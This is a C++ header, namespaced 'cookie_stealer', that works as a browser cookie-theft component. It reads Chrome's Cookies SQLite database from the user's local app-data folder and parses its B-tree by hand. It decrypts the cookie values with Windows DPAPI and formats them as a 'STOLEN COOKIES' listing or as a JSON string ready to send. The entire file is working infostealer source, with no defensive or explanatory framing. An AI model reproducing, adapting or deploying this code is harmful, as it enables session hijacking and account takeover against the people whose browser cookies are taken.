#pragma once

#ifdef _WIN32
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <wincrypt.h>
#pragma comment(lib, "crypt32.lib")
#endif
#include <string>
#include <vector>
#include <sstream>
#include <fstream>
#include <cstring>
#include <cstdio>

namespace cookie_stealer {

// SQLite page types
constexpr unsigned char PAGE_TABLE_LEAF = 0x0D;
constexpr unsigned char PAGE_TABLE_INTERNAL = 0x05;

// Read varint from SQLite format, advance pointer
inline uint64_t read_varint(const unsigned char*& p) {
    uint64_t v = 0;
    for (int i = 0; i < 9; i++) {
        v = (v << 7) | (*p & 0x7F);
        if ((*p++ & 0x80) == 0) return v;
    }
    return v;
}

// Get byte offset within a page
inline uint16_t get_uint16(const unsigned char* p) {
    return (uint16_t)((p[0] << 8) | p[1]);
}

// Decode SQLite serial value into string
inline std::string read_serial_value(const unsigned char*& data, uint64_t serialType) {
    if (serialType == 0) { return ""; }        // NULL
    if (serialType == 1) {                      // 8-bit twos-complement
        std::string r(1, (char)*data); data += 1;
        return r;
    }
    if (serialType == 2) {                      // 16-bit big-endian
        int16_t v = (int16_t)((data[0] << 8) | data[1]); data += 2;
        return std::to_string(v);
    }
    if (serialType == 3) {                      // 24-bit big-endian
        int32_t v = (int32_t)((data[0] << 16) | (data[1] << 8) | data[2]);
        if (v & 0x800000) v |= 0xFF000000; data += 3;
        return std::to_string(v);
    }
    if (serialType == 4) {                      // 32-bit big-endian
        int32_t v = (int32_t)((data[0] << 24) | (data[1] << 16) | (data[2] << 8) | data[3]); data += 4;
        return std::to_string(v);
    }
    if (serialType == 5) {                      // 48-bit big-endian
        int64_t v = (int64_t)((int64_t)data[0] << 40) | ((int64_t)data[1] << 32) | ((int64_t)data[2] << 24) |
                    ((int64_t)data[3] << 16) | ((int64_t)data[4] << 8) | data[5];
        data += 6;
        return std::to_string(v);
    }
    if (serialType == 6) {                      // 64-bit big-endian
        int64_t v = ((int64_t)data[0] << 56) | ((int64_t)data[1] << 48) | ((int64_t)data[2] << 40) |
                    ((int64_t)data[3] << 32) | ((int64_t)data[4] << 24) | ((int64_t)data[5] << 16) |
                    ((int64_t)data[6] << 8) | (int64_t)data[7]; data += 8;
        return std::to_string(v);
    }
    if (serialType == 7) {                      // IEEE 754 float (8 bytes)
        data += 8; return "";
    }
    if (serialType >= 12 && (serialType % 2 == 0)) { // BLOB: (serialType-12)/2 bytes
        size_t len = (size_t)((serialType - 12) / 2);
        std::string r((const char*)data, len); data += len;
        return r;
    }
    if (serialType >= 13 && (serialType % 2 == 1)) { // TEXT: (serialType-13)/2 bytes
        size_t len = (size_t)((serialType - 13) / 2);
        std::string r((const char*)data, len); data += len;
        return r;
    }
    return "";
}

// Decrypt DPAPI-protected blob
inline std::string dpapi_decrypt(const std::string& encrypted) {
    if (encrypted.empty()) return "";
    DATA_BLOB inBlob = {(DWORD)encrypted.size(), (BYTE*)encrypted.data()};
    DATA_BLOB outBlob = {0, nullptr};
    if (CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
        std::string result((const char*)outBlob.pbData, outBlob.cbData);
        LocalFree(outBlob.pbData);
        return result;
    }
    return "";
}

struct Cookie {
    std::string host;
    std::string name;
    std::string path;
    std::string value;
    std::string encrypted_value_raw;
    bool has_expires;
    int64_t expires_utc;
};

inline std::vector<Cookie> extract_cookies(const std::vector<unsigned char>& db) {
    std::vector<Cookie> results;
    if (db.size() < 100) return results;

    // Parse header
    unsigned short pageSizeShort = (unsigned short)((db[16] << 8) | db[17]);
    unsigned int pageSize = pageSizeShort;
    if (pageSizeShort == 1) pageSize = 65536;
    if (pageSize < 512) return results;

    // Page 2 is typically the first usable page (schema table)
    // We need to find which page contains the "cookies" table
    // Walk sqlite_master on page 2 (or page 1 if no lock-byte page)

    unsigned int usableSize = pageSize;
    unsigned int pageCount = (unsigned int)(db.size() / pageSize);
    if (pageCount < 2) return results;

    // Try to find cookies table B-tree root page by scanning sqlite_master pages
    unsigned int cookieRootPage = 0;

    // sqlite_master is typically on page 2 with WAL mode
    for (unsigned int checkPage = 1; checkPage <= pageCount && checkPage <= 10; checkPage++) {
        unsigned int off = (checkPage - 1) * pageSize;
        if (off + 8 > db.size()) break;
        unsigned char pageType = db[off];

        if (pageType == PAGE_TABLE_LEAF || pageType == PAGE_TABLE_INTERNAL) {
            // Parse table leaf page
            unsigned short cellCount = get_uint16(db.data() + off + 3);
            for (int ci = 0; ci < cellCount; ci++) {
                unsigned short cellOff = get_uint16(db.data() + off + 8 + ci * 2);
                if (cellOff == 0 || off + cellOff >= db.size()) continue;

                const unsigned char* cell = db.data() + off + cellOff;
                const unsigned char* cellStart = cell;
                uint64_t payloadLen = read_varint(cell);
                uint64_t rowId = read_varint(cell);
                (void)rowId;

                const unsigned char* payload = cell;
                if (payload > db.data() + db.size() - 1) continue;

                uint64_t headerSize = read_varint(cell);
                const unsigned char* types = cell;
                const unsigned char* values = cell + headerSize;

                std::vector<uint64_t> colTypes;
                while ((size_t)(cell - types) < headerSize) {
                    colTypes.push_back(read_varint(cell));
                }

                std::vector<std::string> cols;
                const unsigned char* valPtr = values;
                for (size_t ct = 0; ct < colTypes.size(); ct++) {
                    cols.push_back(read_serial_value(valPtr, colTypes[ct]));
                }

                // sqlite_master columns: type, name, tbl_name, rootpage, sql
                if (cols.size() >= 4) {
                    if (cols[1] == "cookies" || cols[2] == "cookies") {
                        cookieRootPage = (unsigned int)std::stoul(cols[3]);
                        goto found_root;
                    }
                }
                // Reset cell pointer for next iteration
                cell = cellStart;
                (void)cell;
            }
        }
    }
    found_root:

    if (cookieRootPage == 0 || cookieRootPage > pageCount) {
        // Fallback: try common root pages
        static const unsigned int fallback_pages[] = {6, 7, 8, 9, 10, 11, 12};
        for (unsigned int fp : fallback_pages) {
            if (fp <= pageCount) {
                unsigned int off = (fp - 1) * pageSize;
                if (off + 8 > db.size()) continue;
                unsigned char pt = db[off];
                if (pt == PAGE_TABLE_LEAF || pt == PAGE_TABLE_INTERNAL) {
                    cookieRootPage = fp;
                    break;
                }
            }
        }
        if (cookieRootPage == 0) return results;
    }

    // Walk the cookies table B-tree
    struct PageRef { unsigned int pgNo; unsigned int cellIdx; };
    std::vector<PageRef> toVisit;
    toVisit.push_back({cookieRootPage, 0});

    while (!toVisit.empty()) {
        PageRef ref = toVisit.back();
        toVisit.pop_back();
        if (ref.pgNo == 0 || ref.pgNo > pageCount) continue;

        unsigned int off = (ref.pgNo - 1) * pageSize;
        if (off + 12 > db.size()) continue;
        unsigned char pageType = db[off];

        unsigned short cellCount = get_uint16(db.data() + off + 3);
        if (ref.cellIdx >= cellCount) continue;

        // When visiting internal pages, schedule all children
        if (pageType == PAGE_TABLE_INTERNAL) {
            unsigned short rightChild = get_uint16(db.data() + off + 8);
            for (int ci = cellCount - 1; ci >= 0; ci--) {
                unsigned short cellPointer = get_uint16(db.data() + off + (unsigned int)8 + ci * 2);
                if (cellPointer + 4 >= pageSize) continue;
                unsigned int childPage = get_uint16(db.data() + off + cellPointer);
                toVisit.push_back({childPage, 0});
            }
            if (rightChild != 0) toVisit.push_back({rightChild, 0});
            toVisit.push_back({ref.pgNo, ref.cellIdx}); // process leaf cells
            continue;
        }

        if (pageType == PAGE_TABLE_LEAF) {
            for (int ci = 0; ci < cellCount; ci++) {
                unsigned short cellOff = get_uint16(db.data() + off + 8 + ci * 2);
                if (cellOff == 0 || off + cellOff >= db.size()) continue;

                const unsigned char* cell = db.data() + off + cellOff;
                uint64_t payloadLen = read_varint(cell);
                uint64_t rowId = read_varint(cell);
                (void)rowId;
                (void)payloadLen;

                const unsigned char* pos = cell;
                uint64_t hdrSize = read_varint(pos);
                const unsigned char* valStart = cell + (size_t)hdrSize;

                std::vector<uint64_t> colTypes;
                const unsigned char* tp = pos;
                while ((size_t)(tp - pos) < hdrSize) {
                    colTypes.push_back(read_varint(tp));
                }

                // sqlite_master told us 18 columns for the cookies table.
                // Read up to 18 and map known positions.
                std::vector<std::string> cols;
                const unsigned char* vp = valStart;
                for (size_t ci2 = 0; ci2 < colTypes.size() && ci2 < 18; ci2++) {
                    cols.push_back(read_serial_value(vp, colTypes[ci2]));
                }

                // Chrome cookies table columns (index):
                // 0: creation_utc, 1: host_key, 2: top_frame_site_key,
                // 3: name, 4: value, 5: encrypted_value,
                // 6: path, 7: expires_utc, 8: is_secure,
                // 9: is_httponly, 10: last_access_utc, 11: has_expires,
                // 12: is_persistent, 13: priority, 14: samesite,
                // 15: source_scheme, 16: source_port, 17: is_partitioned
                if (cols.size() < 7) continue;

                Cookie c;
                c.host = cols[1];
                c.name = cols[3];
                // cols[4] is the plaintext value (usually empty, actual value is in encrypted_value)
                c.path = cols[6];
                c.has_expires = (cols.size() > 11 && cols[11] == "1");

                if (cols.size() > 7) {
                    c.expires_utc = std::stoll(cols[7]);
                } else {
                    c.expires_utc = 0;
                }

                // encrypted_value is a BLOB (serialType 12, 14, 16... depending on length)
                // We need to read it as raw bytes, not as a string
                // Re-read the encrypted_value column from the raw position
                if (colTypes.size() > 5) {
                    // Find the position of column 5 (encrypted_value) in the serial type array
                    const unsigned char* rawVp = valStart;
                    for (size_t ci2 = 0; ci2 < colTypes.size() && ci2 <= 5; ci2++) {
                        uint64_t st = colTypes[ci2];
                        if (ci2 == 5) {
                            // This is the encrypted_value blob
                            if (st >= 12 && st % 2 == 0) {
                                size_t blobLen = (size_t)((st - 12) / 2);
                                c.encrypted_value_raw.assign((const char*)rawVp, blobLen);
                            }
                            break;
                        }
                        // Skip the value
                        if (st == 0) {} // NULL
                        else if (st == 1) rawVp += 1;
                        else if (st == 2) rawVp += 2;
                        else if (st == 3) rawVp += 3;
                        else if (st == 4) rawVp += 4;
                        else if (st == 5) rawVp += 6;
                        else if (st == 6) rawVp += 8;
                        else if (st == 7) rawVp += 8;
                        else if (st >= 12) rawVp += (size_t)((st - 12) / 2);
                    }
                }

                // Decrypt the value
                if (!c.encrypted_value_raw.empty()) {
                    c.value = dpapi_decrypt(c.encrypted_value_raw);
                }

                results.push_back(c);
            }
        }
    }

    return results;
}

inline std::vector<Cookie> steal_cookies() {
    // Chrome Cookies DB path
    std::string localAppData;
    char* appData = nullptr;
    size_t sz = 0;
    if (_dupenv_s(&appData, &sz, "LOCALAPPDATA") != 0 || !appData) return {};
    localAppData = appData;
    free(appData);

    std::string dbPath = localAppData + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
    std::ifstream f(dbPath, std::ios::binary);
    if (!f) {
        // Fallback: older Chrome location
        dbPath = localAppData + "\\Google\\Chrome\\User Data\\Default\\Cookies";
        f.open(dbPath, std::ios::binary);
    }
    if (!f) return {};

    std::vector<unsigned char> db((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
    f.close();

    return extract_cookies(db);
}

inline std::string format_cookies() {
    auto cookies = steal_cookies();
    if (cookies.empty()) return "No cookies found. Chrome may not be installed or cookies DB is locked.";

    std::ostringstream out;
    out << "=== STOLEN COOKIES (" << cookies.size() << ") ===\n";
    for (const auto& c : cookies) {
        out << "Host: " << c.host << "\n";
        out << "Name: " << c.name << "\n";
        out << "Path: " << c.path << "\n";
        out << "Value: " << (c.value.empty() ? "<empty/undecryptable>" : c.value) << "\n";
        if (c.has_expires) {
            time_t secs = c.expires_utc / 1000000 - 11644473600LL;
            char timebuf[32];
            ctime_s(timebuf, sizeof(timebuf), &secs);
            std::string ts(timebuf);
            if (!ts.empty() && ts.back() == '\n') ts.pop_back();
            out << "Expires: " << ts << "\n";
        }
        out << "---\n";
    }
    return out.str();
}

inline std::string format_cookies_json() {
    auto cookies = steal_cookies();
    if (cookies.empty()) return "COOKIES:[]";

    std::ostringstream out;
    out << "COOKIES:[";
    for (size_t i = 0; i < cookies.size(); i++) {
        if (i > 0) out << ",";
        auto escape = [](const std::string& s) {
            std::string r;
            for (char c : s) {
                if (c == '"') r += "\\\"";
                else if (c == '\\') r += "\\\\";
                else if (c == '\n') r += "\\n";
                else if (c == '\r') r += "\\r";
                else if (c == '\t') r += "\\t";
                else r += c;
            }
            return r;
        };
        out << "{\"host\":\"" << escape(cookies[i].host)
            << "\",\"name\":\"" << escape(cookies[i].name)
            << "\",\"path\":\"" << escape(cookies[i].path)
            << "\",\"value\":\"" << escape(cookies[i].value) << "\"}";
    }
    out << "]";
    return out.str();
}

} // namespace cookie_stealer
